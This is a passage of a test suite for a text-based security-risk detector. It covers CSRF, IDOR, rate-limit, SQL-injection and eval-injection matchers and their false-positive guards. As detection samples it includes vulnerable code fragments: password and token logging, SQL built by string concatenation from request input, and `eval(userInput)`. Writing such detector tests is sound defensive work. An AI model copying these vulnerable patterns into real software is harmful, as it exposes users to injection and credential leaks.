    const hits = detectRisks("console.log(password) in the authentication handler");
    expect(hits.map((h) => h.conceptId)).toContain("sensitive-data-in-logs");
  });

  it("TRUE-POSITIVE: 'logging the user auth token' still fires sensitive-data-in-logs", () => {
    const hits = detectRisks("logging the user's auth token to the server logs");
    expect(hits.map((h) => h.conceptId)).toContain("sensitive-data-in-logs");
  });

  it("TRUE-POSITIVE: logger.info(token) still fires sensitive-data-in-logs", () => {
    const hits = detectRisks("logger.info('token: ' + token)");
    expect(hits.map((h) => h.conceptId)).toContain("sensitive-data-in-logs");
  });
});

describe("detectRisks — PART B FIX: database-query false-positive guard", () => {
  it("FALSE-POSITIVE: 'query about the table reservation' does NOT fire database/database-query", () => {
    const hits = detectRisks("The query about the table reservation was answered.");
    const ids = hits.map((h) => h.conceptId);
    // Neither database-query nor any security concept should fire on this benign text
    expect(ids).not.toContain("sql-injection-risk");
  });

  it("TRUE-POSITIVE: 'query the users table with SELECT' still fires (sql concept level)", () => {
    // This is a database/SQL concept, not necessarily a security hit — we check detectConcepts
    // coverage is preserved in concepts.test.ts; here we just confirm security lens is not broken
    const hits = detectRisks("SELECT * FROM users WHERE id = 1");
    // No security risk in a safe parameterized query — should not fire sql-injection-risk
    expect(hits.map((h) => h.conceptId)).not.toContain("sql-injection-risk");
  });
});

// ---------------------------------------------------------------------------
// SECURITY_CONCEPT_IDS completeness — updated for 28 concepts
// ---------------------------------------------------------------------------

describe("SECURITY_CONCEPT_IDS completeness (updated)", () => {
  it("has exactly 28 security concept ids (21 original + 7 new)", () => {
    expect(SECURITY_CONCEPT_IDS).toHaveLength(28);
  });

  it("all new concept ids are unique and present", () => {
    const newIds = [
      "open-redirect", "jwt-alg-none", "insecure-cookie",
      "verbose-error-exposed", "cleartext-token-storage",
      "directory-listing", "ssti",
    ];
    for (const id of newIds) {
      expect(SECURITY_CONCEPT_IDS, `${id} missing from SECURITY_CONCEPT_IDS`).toContain(id);
    }
  });
});

describe("riskLessonHint — all 7 new security concepts have SEVERITY + HINT", () => {
  const newIds = [
    "open-redirect", "jwt-alg-none", "insecure-cookie",
    "verbose-error-exposed", "cleartext-token-storage",
    "directory-listing", "ssti",
  ];
  it("returns a non-empty, safety-framed hint for each new concept", () => {
    for (const id of newIds) {
      const hint = riskLessonHint(id).toLowerCase();
      expect(hint.length, `${id} hint is empty`).toBeGreaterThan(10);
      const hasSafetyWord = /risk|safe|fix|never|avoid|danger|protect|instead|should/.test(hint);
      expect(hasSafetyWord, `${id} hint lacks safety framing`).toBe(true);
    }
  });
});

// ---------------------------------------------------------------------------
// Regression: FIX #1 — CSRF false-positive with correctly-secured phrasing
// ---------------------------------------------------------------------------

describe("detectRisks — FIX 1: csrf false-positive guards (correctly-secured code)", () => {
  it("FALSE-POSITIVE: 'CSRF token is added to every form' must NOT fire csrf", () => {
    const hits = detectRisks("The CSRF token is added to every form");
    expect(hits.map((h) => h.conceptId)).not.toContain("csrf");
  });
  it("FALSE-POSITIVE: 'we add a CSRF token for safety' must NOT fire csrf", () => {
    const hits = detectRisks("We add a CSRF token for safety");
    expect(hits.map((h) => h.conceptId)).not.toContain("csrf");
  });
  it("FALSE-POSITIVE: 'CSRF protection is handled by the framework' must NOT fire csrf", () => {
    const hits = detectRisks("CSRF protection is handled by the framework");
    expect(hits.map((h) => h.conceptId)).not.toContain("csrf");
  });
  it("TRUE-POSITIVE: 'no CSRF protection' still fires csrf", () => {
    const hits = detectRisks("no CSRF protection on this form");
    expect(hits.map((h) => h.conceptId)).toContain("csrf");
  });
  it("FALSE-POSITIVE: 'Without doubt, the CSRF token is present' must NOT fire csrf", () => {
    const hits = detectRisks("Without doubt, the CSRF token is present and working.");
    expect(hits.map((h) => h.conceptId)).not.toContain("csrf");
  });
  it("FALSE-POSITIVE: risk word far before CSRF (different clause) must NOT fire csrf", () => {
    const hits = detectRisks("The form was missing a clear call to action, without which CSRF rates drop.");
    expect(hits.map((h) => h.conceptId)).not.toContain("csrf");
  });
  it("TRUE-POSITIVE: 'without CSRF protection' / 'disabled CSRF' still fire", () => {
    expect(detectRisks("the endpoint is without CSRF protection").map((h) => h.conceptId)).toContain("csrf");
    expect(detectRisks("they disabled CSRF on the API").map((h) => h.conceptId)).toContain("csrf");
  });
  it("TRUE-POSITIVE: 'CSRF protection is missing' still fires csrf", () => {
    const hits = detectRisks("CSRF protection is missing from the POST route");
    expect(hits.map((h) => h.conceptId)).toContain("csrf");
  });
  it("TRUE-POSITIVE: 'CSRF token is disabled' still fires csrf", () => {
    const hits = detectRisks("CSRF token is disabled in the middleware");
    expect(hits.map((h) => h.conceptId)).toContain("csrf");
  });
});

// ---------------------------------------------------------------------------
// Regression: FIX #3 — rate-limit matcher bare 'no' alternative
// ---------------------------------------------------------------------------

describe("detectRisks — FIX 3: missing-rate-limit false-positive guard", () => {
  it("FALSE-POSITIVE: 'the rate limit is 100 requests, no problem' must NOT fire missing-rate-limit", () => {
    const hits = detectRisks("the rate limit is 100 requests, no problem");
    expect(hits.map((h) => h.conceptId)).not.toContain("missing-rate-limit");
  });
  it("TRUE-POSITIVE: 'no rate limiting on login' still fires missing-rate-limit", () => {
    const hits = detectRisks("no rate limiting on login");
    expect(hits.map((h) => h.conceptId)).toContain("missing-rate-limit");
  });
});

// ---------------------------------------------------------------------------
// Regression: FIX #4 — IDOR false-positive with working ownership check
// ---------------------------------------------------------------------------

describe("detectRisks — FIX 4: idor false-positive guards (working ownership checks)", () => {
  it("FALSE-POSITIVE: 'ownership check runs before returning the document' must NOT fire idor", () => {
    const hits = detectRisks("the ownership check runs before returning the document");
    expect(hits.map((h) => h.conceptId)).not.toContain("idor");
  });
  it("FALSE-POSITIVE: 'ownership check runs before access' must NOT fire idor", () => {
    const hits = detectRisks("the ownership check runs before access to the resource");
    expect(hits.map((h) => h.conceptId)).not.toContain("idor");
  });
  it("TRUE-POSITIVE: 'missing ownership check' still fires idor", () => {
    const hits = detectRisks("missing ownership check on the document endpoint");
    expect(hits.map((h) => h.conceptId)).toContain("idor");
  });
  it("TRUE-POSITIVE: 'ownership check is bypassed' still fires idor", () => {
    const hits = detectRisks("ownership check is bypassed in the delete route");
    expect(hits.map((h) => h.conceptId)).toContain("idor");
  });
});

// ---------------------------------------------------------------------------
// FIX 1 regression: tightened sql-injection-risk matcher (no \s in leading class)
// ---------------------------------------------------------------------------

describe("detectRisks — FIX 1: sql-injection-risk O(n^2) fix + guards", () => {
  it("30KB whitespace string completes without hanging (performance guard)", () => {
    // This string used to cause quadratic backtracking with \s in the leading class.
    const big = (' + x ').repeat(6000); // ~30KB of whitespace-plus patterns
    const start = Date.now();
    const hits = detectRisks(big);
    const elapsed = Date.now() - start;
    // Must finish in < 2 seconds (generous threshold; real fix is sub-10ms)
    expect(elapsed).toBeLessThan(2000);
    expect(hits.map((h) => h.conceptId)).not.toContain("sql-injection-risk");
  });

  it("benign 'UPDATE: 3 + 1 features' does NOT fire sql-injection-risk", () => {
    const hits = detectRisks("UPDATE: we shipped 3 + 1 new features this week.");
    expect(hits.map((h) => h.conceptId)).not.toContain("sql-injection-risk");
  });

  it("TRUE-POSITIVE: concatenated SQL 'WHERE id = \" + userId' still fires", () => {
    const hits = detectRisks('"WHERE id = " + userId');
    expect(hits.map((h) => h.conceptId)).toContain("sql-injection-risk");
  });

  it("TRUE-POSITIVE: template literal SQL interpolation still fires", () => {
    const hits = detectRisks("db.query(`SELECT * FROM orders WHERE user = ${req.body.id}`)");
    expect(hits.map((h) => h.conceptId)).toContain("sql-injection-risk");
  });
});

// ---------------------------------------------------------------------------
// FIX 2 regression: tightened eval-injection matcher (require real arg char)
// ---------------------------------------------------------------------------

describe("detectRisks — FIX 2: eval-injection tightened matcher", () => {
  it("'eval(uation)' prose does NOT fire eval-injection", () => {
    const hits = detectRisks("the eval(uation) committee will review the candidates");
    expect(hits.map((h) => h.conceptId)).not.toContain("eval-injection");
  });

  it("eval(userInput) still fires eval-injection", () => {
    const hits = detectRisks("eval(userInput)");
    expect(hits.map((h) => h.conceptId)).toContain("eval-injection");
  });

  it("eval('code') still fires eval-injection", () => {
    const hits = detectRisks("eval('malicious code')");
    expect(hits.map((h) => h.conceptId)).toContain("eval-injection");
  });

  it("eval( x ) with spaces still fires eval-injection", () => {
    const hits = detectRisks("eval( x )");
    expect(hits.map((h) => h.conceptId)).toContain("eval-injection");
  });
});
